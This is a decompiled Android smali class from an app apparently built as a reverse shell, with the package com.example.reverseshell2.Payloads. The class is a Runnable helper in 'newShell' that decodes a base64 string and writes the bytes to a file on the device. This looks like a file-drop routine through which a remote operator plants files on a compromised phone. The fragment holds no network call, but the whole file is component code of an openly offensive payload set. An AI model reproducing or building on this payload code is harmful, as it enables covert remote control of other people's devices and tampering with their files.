.class Lcom/example/reverseshell2/Payloads/newShell$2;
.super Ljava/lang/Object;
.source "newShell.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/newShell;->setBase64Data(Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/Payloads/newShell;

.field final synthetic val$base64Data:Ljava/lang/String;

.field final synthetic val$file:Ljava/io/File;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/Payloads/newShell;Ljava/io/File;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/Payloads/newShell;

    .line 166
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/newShell$2;->this$0:Lcom/example/reverseshell2/Payloads/newShell;

    iput-object p2, p0, Lcom/example/reverseshell2/Payloads/newShell$2;->val$file:Ljava/io/File;

    iput-object p3, p0, Lcom/example/reverseshell2/Payloads/newShell$2;->val$base64Data:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 170
    :try_start_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/newShell$2;->val$file:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->createNewFile()Z

    .line 171
    new-instance v0, Ljava/io/FileOutputStream;

    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/newShell$2;->val$file:Ljava/io/File;

    invoke-direct {v0, v1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 172
    .local v0, "fos":Ljava/io/FileOutputStream;
    iget-object v1, p0, Lcom/example/reverseshell2/Payloads/newShell$2;->val$base64Data:Ljava/lang/String;

    const/4 v2, 0x2

    invoke-static {v1, v2}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/FileOutputStream;->write([B)V

    .line 173
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v0    # "fos":Ljava/io/FileOutputStream;
    goto :goto_0

    .line 176
    :catch_0
    move-exception v0

    .line 177
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 174
    .end local v0    # "e":Ljava/io/IOException;
    :catch_1
    move-exception v0

    .line 175
    .local v0, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    .line 178
    .end local v0    # "e":Ljava/io/FileNotFoundException;
    :goto_0
    nop

    .line 180
    :goto_1
    return-void
.end method
